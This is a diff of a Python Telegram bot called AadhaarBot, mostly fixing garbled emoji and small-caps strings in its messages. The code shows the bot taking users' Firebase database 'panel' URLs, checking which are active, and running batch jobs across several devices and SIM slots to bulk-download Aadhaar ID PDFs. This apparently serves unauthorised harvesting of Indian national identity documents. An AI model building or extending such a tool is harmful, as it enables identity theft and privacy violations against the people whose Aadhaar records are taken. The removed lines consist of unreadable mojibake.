                     is_finished = (done_c >= total_c) or self.active_batches.get(uid, {}).get('cancel', False)
                     kb = None if is_finished else InlineKeyboardMarkup([
-                        [InlineKeyboardButton("Ã¡Â´ÂÃ¡Â´ÂÃÂ´Ã¡Â´ÂÃ¡Â´ÂÃÂ ÃÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃÂ", callback_data=f"cancel_batch_{uid}", style="danger")]
+                        [InlineKeyboardButton("ᴄᴀɴᴄᴇʟ ʙᴀᴛᴄʜ", callback_data=f"cancel_batch_{uid}", style="danger")]
                     ])
 
                     if is_rich_mode:
@@ -4314,18 +4276,18 @@ class AadhaarBot:
 
             async with sem:
                 if self.active_batches.get(uid, {}).get('cancel'):
-                    dev_statuses[status_key]['status'] = "Ã°ÂÂÂ Cancelled"
+                    dev_statuses[status_key]['status'] = "🛑 Cancelled"
                     dev_statuses[status_key]['done'] = True
                     dashboard_dirty.set()
                     return
 
                 if sim_lbl and sim_lbl != "SIM1":
-                    dev_statuses[status_key]['status'] = "Ã¢ÂÂ³ Waiting for SIM 1..."
+                    dev_statuses[status_key]['status'] = "⏳ Waiting for SIM 1..."
                     dashboard_dirty.set()
 
                 async with device_locks[did]:
                     if self.active_batches.get(uid, {}).get('cancel'):
-                        dev_statuses[status_key]['status'] = "Ã°ÂÂÂ Cancelled"
+                        dev_statuses[status_key]['status'] = "🛑 Cancelled"
                         dev_statuses[status_key]['done'] = True
                         dashboard_dirty.set()
                         return
@@ -4334,7 +4296,7 @@ class AadhaarBot:
                         dev_statuses[status_key]['status'] = msg_text
                         dashboard_dirty.set()
 
-                    dev_statuses[status_key]['status'] = "Ã¢ÂÂ³ Starting..."
+                    dev_statuses[status_key]['status'] = "⏳ Starting..."
                     dashboard_dirty.set()
 
                     try:
@@ -4351,14 +4313,14 @@ class AadhaarBot:
                         if ok:
                             dev_statuses[status_key]['success'] = True
                             pname = meta.get('name') if meta else 'Success'
-                            dev_statuses[status_key]['status'] = f"Ã¢ÂÂ Done ({pname})"
+                            dev_statuses[status_key]['status'] = f"✅ Done ({pname})"
                             dev_statuses[status_key]['meta'] = meta
                         else:
-                            dev_statuses[status_key]['status'] = f"Ã¢ÂÂ {reason}"
+                            dev_statuses[status_key]['status'] = f"❌ {reason}"
                     except Exception as ex:
                         logger.error(f"Worker exception {status_key}: {ex}", exc_info=True)
                         dev_statuses[status_key]['done'] = True
-                        dev_statuses[status_key]['status'] = "Ã¢ÂÂ Error"
+                        dev_statuses[status_key]['status'] = "❌ Error"
                     dashboard_dirty.set()
 
         try:
@@ -4403,14 +4365,14 @@ class AadhaarBot:
         await ctx.bot.send_message(
             chat_id=chat_id,
             text=(
-                f"<b>{emo('Ã°ÂÂÂ')} ÃÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃÂ Ã¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´Â Ã¡Â´ÂÃ¡Â´ÂÃ¡Â´Â¡ÃÂ´ÃÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´Â Ã¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´Â!</b>\n\n"
+                f"<b>{emo('🎉')} ʙᴀᴛᴄʜ ᴀᴜᴛᴏ ᴅᴏᴡɴʟᴏᴀᴅ ᴄᴏᴍᴘʟᴇᴛᴇᴅ!</b>\n\n"
                 "<blockquote>"
-                f"<b>{emo('Ã°ÂÂÂ¥')} Panel:</b> <code>{html.escape(panel_name)}</code>\n"
-                f"<b>{emo('Ã°ÂÂÂ±')} Total Devices:</b> <code>{len(dev_statuses)}</code>\n"
-                f"<b>{emo('Ã¢ÂÂ')} Successfully Downloaded:</b> <code>{final_success}</code>\n"
-                f"<b>{emo('Ã¢ÂÂ')} Failed / Skipped:</b> <code>{final_fail}</code>"
+                f"<b>{emo('🔥')} Panel:</b> <code>{html.escape(panel_name)}</code>\n"
+                f"<b>{emo('📱')} Total Devices:</b> <code>{len(dev_statuses)}</code>\n"
+                f"<b>{emo('✅')} Successfully Downloaded:</b> <code>{final_success}</code>\n"
+                f"<b>{emo('❌')} Failed / Skipped:</b> <code>{final_fail}</code>"
                 "</blockquote>\n\n"
-                "<b>Sabhi Aadhaar PDFs upar bhej diye gaye hain! Ã°ÂÂÂ</b>"
+                "<b>Sabhi Aadhaar PDFs upar bhej diye gaye hain! 📎</b>"
             ),
             reply_markup=self.get_main_menu_keyboard(),
             parse_mode='HTML'
@@ -4433,11 +4395,11 @@ class AadhaarBot:
             if data.get('awaiting_firebase_add'):
                 self.update_user_data(uid, 'awaiting_firebase_add', None)
                 self.update_user_data(uid, 'fb_adding_name', None)
-                await update.message.reply_text("Ã¢ÂÂ Firebase add cancel ho gaya. /start")
+                await update.message.reply_text("❌ Firebase add cancel ho gaya. /start")
                 return
             if data.get('download_mode') or (data.get('stage') and data.get('stage') != 'main_menu'):
                 self.clear_user_data(uid)
-                await update.message.reply_text("Ã¢ÂÂ Session cancel ho gaya. /start")
+                await update.message.reply_text("❌ Session cancel ho gaya. /start")
                 return
 
         # 2. If user is in Aadhaar download mode, clear any dangling firebase add state
@@ -4449,10 +4411,10 @@ class AadhaarBot:
         if data.get('awaiting_firebase_add'):
             step = data.get('awaiting_firebase_add')
             cancel_kb = InlineKeyboardMarkup([
-                [InlineKeyboardButton("Ã¡Â´ÂÃ¡Â´ÂÃÂ´Ã¡Â´ÂÃ¡Â´ÂÃÂ", callback_data="cancel_firebase_add", style="danger")]
+                [InlineKeyboardButton("ᴄᴀɴᴄᴇʟ", callback_data="cancel_firebase_add", style="danger")]
             ])
 
-            # Step 1 Ã¢ÂÂ naam liya, ab URL maango (ya agar direct URL/link bheja ho to auto-detect)
+            # Step 1 — naam liya, ab URL maango (ya agar direct URL/link bheja ho to auto-detect)
             if step == 'name':
                 extracted_direct = extract_all_firebases(text_raw)
                 if extracted_direct:
@@ -4463,17 +4425,17 @@ class AadhaarBot:
                     self.update_user_data(uid, 'fb_adding_name', text_raw)
                     self.update_user_data(uid, 'awaiting_firebase_add', 'url')
                     await update.message.reply_text(
-                        f"<b>{emo('Ã¢ÂÂ')} ÃÂ´Ã¡Â´ÂÃ¡Â´ÂÃ¡Â´Â sÃ¡Â´ÂÃ¡Â´Â Ã¡Â´ÂÃ¡Â´Â: <code>{html.escape(text_raw)}</code></b>\n\n"
-                        f"<b>{emo('Ã°ÂÂÂ')} sÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´Â 2:</b> ÃÂ´Ã¡Â´ÂÃ¡Â´Â¡ Ã¡Â´ÂÃÂ´Ã¡Â´ÂÃ¡Â´ÂÃÂ ÃÂÃ¡Â´ÂÃ¡Â´ÂÃÂ ÃªÂÂ°ÃÂªÃÂÃ¡Â´ÂÃÂÃ¡Â´ÂsÃ¡Â´Â Ã¡Â´ÂÃÂÃÂ:\n"
+                        f"<b>{emo('✅')} ɴᴀᴍᴇ sᴀᴠᴇᴅ: <code>{html.escape(text_raw)}</code></b>\n\n"
+                        f"<b>{emo('🔗')} sᴛᴇᴘ 2:</b> ɴᴏᴡ ᴇɴᴛᴇʀ ʏᴏᴜʀ ꜰɪʀᴇʙᴀsᴇ ᴜʀʟ:\n"
                         "<code>https://xxx-default-rtdb.firebaseio.com</code>\n"
-                        "<i>(ÃÂÃ¡Â´ÂÃ¡Â´Â Ã¡Â´ÂÃ¡Â´ÂÃÂ´ Ã¡Â´ÂÃÂsÃ¡Â´Â sÃ¡Â´ÂÃÂ´Ã¡Â´Â Ã¡Â´Â ÃÂÃ¡Â´ÂÃÂÃ¡Â´Â ?m= Ã¡Â´ÂÃ¡Â´ÂÃÂ´Ã¡Â´ÂÃÂ ÃÂÃÂªÃÂ´Ã¡Â´Â)</i>\n\n"
-                        "<b>Ã¡Â´ÂÃ¡Â´ÂÃÂ´Ã¡Â´ÂÃ¡Â´ÂÃÂ:</b> Ã¡Â´ÂÃÂÃÂªÃ¡Â´ÂÃ¡Â´Â Ã¡Â´ÂÃÂÃ¡Â´Â ÃÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃÂ´ ÃÂÃ¡Â´ÂÃÂÃ¡Â´ÂÃ¡Â´Â¡ Ã¡Â´ÂÃÂ sÃ¡Â´ÂÃÂ´Ã¡Â´Â /cancel",
+                        "<i>(ʏᴏᴜ ᴄᴀɴ ᴀʟsᴏ sᴇɴᴅ ᴀ ʙᴜʟᴋ ?m= ᴘᴀɴᴇʟ ʟɪɴᴋ)</i>\n\n"
+                        "<b>ᴄᴀɴᴄᴇʟ:</b> ᴄʟɪᴄᴋ ᴛʜᴇ ʙᴜᴛᴛᴏɴ ʙᴇʟᴏᴡ ᴏʀ sᴇɴᴅ /cancel",
                         reply_markup=cancel_kb,
                         parse_mode='HTML'
                     )
                     return
 
-            # Step 2 Ã¢ÂÂ URL aaya, validate and save karo
+            # Step 2 — URL aaya, validate and save karo
             if step == 'url':
                 url_raw = text_raw.strip()
                 name = data.get('fb_adding_name') or ''
@@ -4481,11 +4443,11 @@ class AadhaarBot:
                 # Check if user entered a 10-digit mobile number by mistake
                 if re.match(r'^[6-9]\d{9}$', url_raw):
                     await update.message.reply_text(
-                        f"<b>{emo('Ã¢ÂÂ Ã¯Â¸Â')} Ã¡Â´ÂÃ¡Â´ÂÃÂÃÂªÃÂÃ¡Â´Â ÃÂ´Ã¡Â´ÂÃ¡Â´ÂÃÂÃ¡Â´ÂÃÂ Ã¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´Â!</b>\n\n"
+                        f"<b>{emo('⚠️')} ᴍᴏʙɪʟᴇ ɴᴜᴍʙᴇʀ ᴅᴇᴛᴇᴄᴛᴇᴅ!</b>\n\n"
                         "<blockquote>"
                         "<b>Aapne 10-digit mobile number bheja hai, lekin bot abhi Firebase URL ka wait kar raha tha.</b>\n\n"
-                        "Ã¢ÂÂ¢ <b>Aadhaar Download</b> karna hai? Neeche <b>Cancel</b> dabayein aur fir <b>Download Aadhaar</b> click karein.\n"
-                        "Ã¢ÂÂ¢ <b>Firebase Add</b> karna hai? Sahi Realtime Database URL daalein."
+                        "• <b>Aadhaar Download</b> karna hai? Neeche <b>Cancel</b> dabayein aur fir <b>Download Aadhaar</b> click karein.\n"
+                        "• <b>Firebase Add</b> karna hai? Sahi Realtime Database URL daalein."
                         "</blockquote>",
                         reply_markup=cancel_kb,
                         parse_mode='HTML'
@@ -4495,14 +4457,14 @@ class AadhaarBot:
                 extracted_list = extract_all_firebases(url_raw)
                 if not extracted_list:
                     await update.message.reply_text(
-                        f"<b>{emo('Ã¢ÂÂ')} ÃÂªÃÂ´Ã¡Â´Â Ã¡Â´ÂÃÂÃÂªÃ¡Â´Â ÃªÂÂ°ÃÂªÃÂÃ¡Â´ÂÃÂÃ¡Â´ÂsÃ¡Â´Â Ã¡Â´ÂÃÂÃÂ!</b>\n\n"
+                        f"<b>{emo('❌')} ɪɴᴠᴀʟɪᴅ ꜰɪʀᴇʙᴀsᴇ ᴜʀʟ!</b>\n\n"
                         "<blockquote>"
-                        "<b>Ã¡Â´ÂÃÂÃÂªs ÃÂªs ÃÂ´Ã¡Â´ÂÃ¡Â´Â Ã¡Â´Â Ã¡Â´Â Ã¡Â´ÂÃÂÃÂªÃ¡Â´Â ÃªÂÂ°ÃÂªÃÂÃ¡Â´ÂÃÂÃ¡Â´ÂsÃ¡Â´Â ÃÂÃ¡Â´ÂÃ¡Â´ÂÃÂÃ¡Â´ÂÃÂªÃ¡Â´ÂÃ¡Â´Â Ã¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃÂÃ¡Â´ÂsÃ¡Â´Â Ã¡Â´ÂÃÂÃÂ Ã¡Â´ÂÃÂ Ã¡Â´ÂÃ¡Â´ÂÃÂ´Ã¡Â´ÂÃÂ ÃÂÃÂªÃÂ´Ã¡Â´Â.</b>\n"
-                        "Ã¡Â´ÂÃÂ´ÃÂÃÂ Ã¡Â´Â Ã¡Â´ÂÃÂÃÂªÃ¡Â´Â ÃªÂÂ°ÃÂªÃÂÃ¡Â´ÂÃÂÃ¡Â´ÂsÃ¡Â´Â Ã¡Â´ÂÃÂÃÂs Ã¡Â´ÂÃÂÃ¡Â´Â Ã¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´Â.\n\n"
-                        f"<b>{emo('Ã°ÂÂÂ')} Ã¡Â´ÂxÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃÂÃ¡Â´Â ÃªÂÂ°Ã¡Â´ÂÃÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´Âs:</b>\n"
-                        "Ã¢ÂÂ¢ <code>https://your-panel-default-rtdb.firebaseio.com</code>\n"
-                        "Ã¢ÂÂ¢ <code>https://your-site.vercel.app/?m=base64...</code>\n\n"
-                        "<b>Ã¡Â´ÂÃÂÃ¡Â´ÂÃ¡Â´ÂsÃ¡Â´Â Ã¡Â´ÂÃÂ´Ã¡Â´ÂÃ¡Â´ÂÃÂ Ã¡Â´Â Ã¡Â´Â Ã¡Â´ÂÃÂÃÂªÃ¡Â´Â Ã¡Â´ÂÃÂÃÂ Ã¡Â´ÂÃÂ¢Ã¡Â´ÂÃÂªÃÂ´ Ã¡Â´ÂÃÂ Ã¡Â´ÂÃÂÃÂªÃ¡Â´ÂÃ¡Â´Â Ã¡Â´ÂÃ¡Â´ÂÃÂ´Ã¡Â´ÂÃ¡Â´ÂÃÂ ÃÂÃ¡Â´ÂÃÂÃ¡Â´ÂÃ¡Â´Â¡.</b>"
+                        "<b>ᴛʜɪs ɪs ɴᴏᴛ ᴀ ᴠᴀʟɪᴅ ꜰɪʀᴇʙᴀsᴇ ʀᴇᴀʟᴛɪᴍᴇ ᴅᴀᴛᴀʙᴀsᴇ ᴜʀʟ ᴏʀ ᴘᴀɴᴇʟ ʟɪɴᴋ.</b>\n"
+                        "ᴏɴʟʏ ᴠᴀʟɪᴅ ꜰɪʀᴇʙᴀsᴇ ᴜʀʟs ᴀʀᴇ ᴀᴄᴄᴇᴘᴛᴇᴅ.\n\n"
+                        f"<b>{emo('📌')} ᴇxᴀᴍᴘʟᴇ ꜰᴏʀᴍᴀᴛs:</b>\n"
+                        "• <code>https://your-panel-default-rtdb.firebaseio.com</code>\n"
+                        "• <code>https://your-site.vercel.app/?m=base64...</code>\n\n"
+                        "<b>ᴘʟᴇᴀsᴇ ᴇɴᴛᴇʀ ᴀ ᴠᴀʟɪᴅ ᴜʀʟ ᴀɢᴀɪɴ ᴏʀ ᴄʟɪᴄᴋ ᴄᴀɴᴄᴇʟ ʙᴇʟᴏᴡ.</b>"
                         "</blockquote>",
                         reply_markup=cancel_kb,
                         parse_mode='HTML'
@@ -4512,7 +4474,7 @@ class AadhaarBot:
                 # Multiple Firebase panels detected (e.g. from ?m= link or multi URLs)
                 if len(extracted_list) > 1:
                     checking_msg = await update.message.reply_text(
-                        f"<b>{emo('Ã¢ÂÂ³')} {len(extracted_list)} ÃªÂÂ°ÃÂªÃÂÃ¡Â´ÂÃÂÃ¡Â´ÂÃªÂÂ±Ã¡Â´Â Ã¡Â´ÂÃ¡Â´ÂÃÂ´Ã¡Â´ÂÃÂÃªÂÂ± Ã¡Â´Â Ã¡Â´ÂÃÂÃÂªÃªÂÂ°ÃÂ ÃÂÃ¡Â´Â ÃÂÃ¡Â´ÂÃÂÃ¡Â´Â ÃÂÃ¡Â´ÂÃÂªÃÂ´...</b>\n\n"
+                        f"<b>{emo('⏳')} {len(extracted_list)} ꜰɪʀᴇʙᴀꜱᴇ ᴘᴀɴᴇʟꜱ ᴠᴇʀɪꜰʏ ʜᴏ ʀᴀʜᴇ ʜᴀɪɴ...</b>\n\n"
                         f"<i>Sabhi panels ki active status check aur database me add kiya ja raha hai...</i>",
                         parse_mode='HTML'
                     )
@@ -4549,10 +4511,10 @@ class AadhaarBot:
                     if not active_panels:
                         first_err = inactive_panels[0].get('reason', 'Database deactivated') if inactive_panels else 'No active database'
                         await update.message.reply_text(
-                            f"<b>{emo('Ã¢ÂÂ')} ÃªÂÂ±Ã¡Â´ÂÃÂÃÂÃÂª ÃªÂÂ°ÃÂªÃÂÃ¡Â´ÂÃÂÃ¡Â´ÂÃªÂÂ±Ã¡Â´Â Ã¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃÂªÃ¡Â´Â Ã¡Â´ÂÃ¡Â´ÂÃ¡Â´Â ÃÂÃ¡Â´ÂÃÂªÃÂ´!</b>\n\n"
+                            f"<b>{emo('❌')} ꜱᴀʙʜɪ ꜰɪʀᴇʙᴀꜱᴇ ᴅᴇᴀᴄᴛɪᴠᴀᴛᴇ ʜᴀɪɴ!</b>\n\n"
                             f"<blockquote>"
                             f"<b>Is link me se koi bhi panel active nahi mila ({len(inactive_panels)} inactive).</b>\n\n"
-                            f"<b>Ã°ÂÂÂ Reason:</b> <i>{html.escape(first_err)}</i>\n\n"
+                            f"<b>📌 Reason:</b> <i>{html.escape(first_err)}</i>\n\n"
                             f"<b>Kripya active panels daalein ya /cancel karein.</b>"
                             f"</blockquote>",
                             reply_markup=cancel_kb,
@@ -4568,17 +4530,17 @@ class AadhaarBot:
 
                     lines = []
                     for i, p in enumerate(processed[:20], 1):
-                        st_icon = emo('Ã¢ÂÂ') if p.get('active') else emo('Ã¢ÂÂ')
-                        tag = "Active Ã°ÂÂÂ¢" if p.get('active') else "Inactive Ã°ÂÂÂ´"
+                        st_icon = emo('✅') if p.get('active') else emo('❌')
+                        tag = "Active 🟢" if p.get('active') else "Inactive 🔴"
                         lines.append(f"<code>[{i:02d}]</code> {st_icon} <b>{html.escape(p['name'])}</b>: <code>{tag}</code>")
                     if len(processed) > 20:
                         lines.append(f"<i>...aur {len(processed) - 20} aur panels</i>")
 
                     kb = self.get_firebase_selection_keyboard(uid)
                     await update.message.reply_text(
-                        f"<b>{emo('Ã°ÂÂÂ¥')} {len(active_panels)}/{len(processed)} ÃªÂÂ°ÃÂªÃÂÃ¡Â´ÂÃÂÃ¡Â´ÂÃªÂÂ±Ã¡Â´Â Ã¡Â´ÂÃ¡Â´ÂÃÂ´Ã¡Â´ÂÃÂÃªÂÂ± Ã¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´Â!</b>\n\n"
+                        f"<b>{emo('🔥')} {len(active_panels)}/{len(processed)} ꜰɪʀᴇʙᴀꜱᴇ ᴘᴀɴᴇʟꜱ ᴀᴅᴅᴇᴅ!</b>\n\n"
                         f"<blockquote>" + "\n".join(lines) + "</blockquote>\n\n"
-                        f"<b>Sabhi {len(active_panels)} panels ke alag-alag buttons neeche menu me add ho gaye hain! Kisi bhi panel par click karke direct download kar sakte hain. Ã¢ÂÂ¡</b>",
+                        f"<b>Sabhi {len(active_panels)} panels ke alag-alag buttons neeche menu me add ho gaye hain! Kisi bhi panel par click karke direct download kar sakte hain. ⚡</b>",
                         reply_markup=kb,
                         parse_mode='HTML'
                     )
@@ -4591,7 +4553,7 @@ class AadhaarBot:
                 p_name = name if (name and name != 'My Firebase') else item.get('name') or extract_firebase_name_from_url(url)
 
                 checking_msg = await update.message.reply_text(
-                    f"<b>{emo('Ã¢ÂÂ³')} ÃªÂÂ°ÃÂªÃÂÃ¡Â´ÂÃÂÃ¡Â´ÂÃªÂÂ±Ã¡Â´Â Ã¡Â´Â Ã¡Â´ÂÃÂÃÂªÃªÂÂ°ÃÂ ÃÂÃ¡Â´Â ÃÂÃ¡Â´ÂÃÂÃ¡Â´Â ÃÂÃ¡Â´ÂÃÂª...</b>\n\n"
+                    f"<b>{emo('⏳')} ꜰɪʀᴇʙᴀꜱᴇ ᴠᴇʀɪꜰʏ ʜᴏ ʀᴀʜᴀ ʜᴀɪ...</b>\n\n"
                     f"<code>{html.escape(url)}</code>",
                     parse_mode='HTML'
                 )
@@ -4602,10 +4564,10 @@ class AadhaarBot:
                     except Exception:
                         pass
                     await update.message.reply_text(
-                        f"<b>{emo('Ã¢ÂÂ')} ÃªÂÂ°ÃÂªÃÂÃ¡Â´ÂÃÂÃ¡Â´ÂÃªÂÂ±Ã¡Â´Â Ã¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃÂªÃ¡Â´Â Ã¡Â´ÂÃ¡Â´ÂÃ¡Â´Â ÃÂÃ¡Â´ÂÃÂª!</b>\n\n"
+                        f"<b>{emo('❌')} ꜰɪʀᴇʙᴀꜱᴇ ᴅᴇᴀᴄᴛɪᴠᴀᴛᴇ ʜᴀɪ!</b>\n\n"
                         "<blockquote>"
                         f"<b>Ye Firebase panel deactivate ya delete ho chuka hai aur add nahi kiya ja sakta.</b>\n\n"
-                        f"<b>Ã°ÂÂÂ Reason:</b> <i>{html.escape(reason)}</i>\n\n"
+                        f"<b>📌 Reason:</b> <i>{html.escape(reason)}</i>\n\n"
                         "<b>Kripya active Firebase URL daalein ya neeche button se cancel karein.</b>"
                         "</blockquote>",
                         reply_markup=cancel_kb,
@@ -4629,11 +4591,11 @@ class AadhaarBot:
 
                 kb = self.get_firebase_selection_keyboard(uid)
                 await update.message.reply_text(
-                    f"<b>{emo('Ã¢ÂÂ')} ÃªÂÂ°ÃÂªÃÂÃ¡Â´ÂÃÂÃ¡Â´ÂÃªÂÂ±Ã¡Â´Â ÃªÂÂ±Ã¡Â´ÂÃ¡Â´Â Ã¡Â´ÂÃ¡Â´Â & Ã¡Â´Â Ã¡Â´ÂÃÂÃÂªÃªÂÂ°ÃÂªÃ¡Â´ÂÃ¡Â´Â!</b>\n\n"
+                    f"<b>{emo('✅')} ꜰɪʀᴇʙᴀꜱᴇ ꜱᴀᴠᴇᴅ & ᴠᴇʀɪꜰɪᴇᴅ!</b>\n\n"
                     "<blockquote>"
-                    f"<b>Ã°ÂÂÂ Naam:</b> <code>{html.escape(p_name)}</code>\n"
-                    f"<b>Ã°ÂÂÂ URL:</b> <code>{html.escape(url)}</code>\n"
-                    f"<b>Ã¢ÂÂ¡ Status:</b> <code>Active Ã°ÂÂÂ¢</code>"
+                    f"<b>📌 Naam:</b> <code>{html.escape(p_name)}</code>\n"
+                    f"<b>🔗 URL:</b> <code>{html.escape(url)}</code>\n"
+                    f"<b>⚡ Status:</b> <code>Active 🟢</code>"
                     "</blockquote>\n\n"
                     "<b>Ab Download via Firebase se is panel se download kar sakte ho.</b>",
                     reply_markup=kb,
@@ -4646,18 +4608,18 @@ class AadhaarBot:
             self.update_user_data(uid, 'broadcast_chat_id', update.message.chat_id)
             self.update_user_data(uid, 'awaiting_broadcast', False)
             pin_mode = data.get('broadcast_pin', False)
-            mode_title = f"{emo('Ã°ÂÂÂ')} Ã¡Â´ÂÃÂªÃÂ´ ÃÂÃÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂsÃ¡Â´Â Ã¡Â´ÂÃ¡Â´ÂÃÂ´ÃªÂÂ°ÃÂªÃÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃÂªÃ¡Â´ÂÃÂ´" if pin_mode else f"{emo('Ã¢ÂÂ Ã¯Â¸Â')} ÃÂÃÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂsÃ¡Â´Â Ã¡Â´ÂÃ¡Â´ÂÃÂ´ÃªÂÂ°ÃÂªÃÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃÂªÃ¡Â´ÂÃÂ´"
-            pin_note = "\n<b>Ã°ÂÂÂ NOTE: This broadcast will be automatically PINNED in all users' chats!</b>\n" if pin_mode else ""
+            mode_title = f"{emo('📌')} ᴘɪɴ ʙʀᴏᴀᴅᴄᴀsᴛ ᴄᴏɴꜰɪʀᴍᴀᴛɪᴏɴ" if pin_mode else f"{emo('⚠️')} ʙʀᴏᴀᴅᴄᴀsᴛ ᴄᴏɴꜰɪʀᴍᴀᴛɪᴏɴ"
+            pin_note = "\n<b>📌 NOTE: This broadcast will be automatically PINNED in all users' chats!</b>\n" if pin_mode else ""
             kb = InlineKeyboardMarkup([
-                [InlineKeyboardButton("Ã¢ÂÂ YES, SEND BROADCAST", callback_data='broadcast_confirm_msg'),
-                 InlineKeyboardButton("Ã¢ÂÂ CANCEL", callback_data='broadcast_cancel')]
+                [InlineKeyboardButton("✅ YES, SEND BROADCAST", callback_data='broadcast_confirm_msg'),
+                 InlineKeyboardButton("❌ CANCEL", callback_data='broadcast_cancel')]
             ])
             total = get_all_users_count()
             await update.message.reply_text(
                 f"<b>{mode_title}</b>\n\n"
-                f"<b>{emo('Ã°ÂÂÂ¤')} Ã¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃÂ ÃÂÃ¡Â´ÂÃ¡Â´ÂÃÂªÃ¡Â´ÂÃÂªÃ¡Â´ÂÃÂ´Ã¡Â´Âs: {total}</b>{pin_note}\n"
-                "<b>Ã°ÂÂÂ Ã¡Â´ÂÃ¡Â´ÂÃÂÃ¡Â´ÂÃÂ¢ÃÂÃ¡Â´ÂÃ¡Â´Â Ã¡Â´ÂÃÂÃ¡Â´ÂÃ¡Â´ÂÃÂªÃ¡Â´ÂÃ¡Â´Â Ã¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃÂªs Ã¡Â´ÂÃÂ´Ã¡Â´Â ÃªÂÂ°Ã¡Â´ÂÃÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃÂªÃÂ´ÃÂ¢ Ã¡Â´ÂÃÂÃ¡Â´Â 100% Ã¡Â´ÂÃÂÃ¡Â´ÂsÃ¡Â´ÂÃÂÃ¡Â´Â Ã¡Â´ÂÃ¡Â´Â.</b>\n"
-                "<b>Ã¡Â´ÂÃÂÃ¡Â´Â ÃÂÃ¡Â´ÂÃ¡Â´Â sÃ¡Â´ÂÃÂÃ¡Â´Â ÃÂÃ¡Â´ÂÃ¡Â´Â Ã¡Â´Â¡Ã¡Â´ÂÃÂ´Ã¡Â´Â Ã¡Â´ÂÃ¡Â´Â sÃ¡Â´ÂÃÂ´Ã¡Â´Â Ã¡Â´ÂÃÂÃÂªs ÃÂÃÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂsÃ¡Â´Â?</b>",
+                f"<b>{emo('👤')} ᴛᴏᴛᴀʟ ʀᴇᴄɪᴘɪᴇɴᴛs: {total}</b>{pin_note}\n"
+                "<b>🌟 ᴛᴇʟᴇɢʀᴀᴍ ᴘʀᴇᴍɪᴜᴍ ᴇᴍᴏᴊɪs ᴀɴᴅ ꜰᴏʀᴍᴀᴛᴛɪɴɢ ᴀʀᴇ 100% ᴘʀᴇsᴇʀᴠᴇᴅ.</b>\n"
+                "<b>ᴀʀᴇ ʏᴏᴜ sᴜʀᴇ ʏᴏᴜ ᴡᴀɴᴛ ᴛᴏ sᴇɴᴅ ᴛʜɪs ʙʀᴏᴀᴅᴄᴀsᴛ?</b>",
                 reply_markup=kb, parse_mode='HTML')
             return
 
@@ -4675,10 +4637,10 @@ class AadhaarBot:
 
         if is_maintenance_mode() and not is_admin(uid):
             await update.message.reply_text(
-                f"<b>{emo('Ã°ÂÂÂ Ã¯Â¸Â')} Ã¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃÂÃ¡Â´ÂÃ¡Â´ÂÃÂ Ã¡Â´ÂÃ¡Â´ÂÃ¡Â´Â¡ÃÂ´ÃÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´Â Ã¡Â´ÂÃÂ´Ã¡Â´ÂÃ¡Â´ÂÃÂ Ã¡Â´ÂÃ¡Â´ÂÃÂªÃÂ´Ã¡Â´ÂÃ¡Â´ÂÃÂ´Ã¡Â´ÂÃÂ´Ã¡Â´ÂÃ¡Â´Â</b>\n\n"
+                f"<b>{emo('🛠️')} ᴀᴀᴅʜᴀᴀʀ ᴅᴏᴡɴʟᴏᴀᴅ ᴜɴᴅᴇʀ ᴍᴀɪɴᴛᴇɴᴀɴᴄᴇ</b>\n\n"
                 "<blockquote>"
-                "<b>Ã¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃÂÃ¡Â´ÂÃ¡Â´ÂÃÂ Ã¡Â´ÂÃ¡Â´ÂÃÂÃ¡Â´Â Ã¡Â´ÂÃ¡Â´ÂÃ¡Â´Â¡ÃÂ´ÃÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´Â sÃ¡Â´ÂÃÂÃ¡Â´Â ÃÂªÃ¡Â´ÂÃ¡Â´Â ÃÂªs Ã¡Â´ÂÃ¡Â´ÂÃÂÃÂÃ¡Â´ÂÃÂ´Ã¡Â´ÂÃÂÃÂ Ã¡Â´ÂÃÂ´Ã¡Â´ÂÃ¡Â´ÂÃÂ Ã¡Â´ÂÃ¡Â´ÂÃÂªÃÂ´Ã¡Â´ÂÃ¡Â´ÂÃÂ´Ã¡Â´ÂÃÂ´Ã¡Â´ÂÃ¡Â´Â.</b>\n"
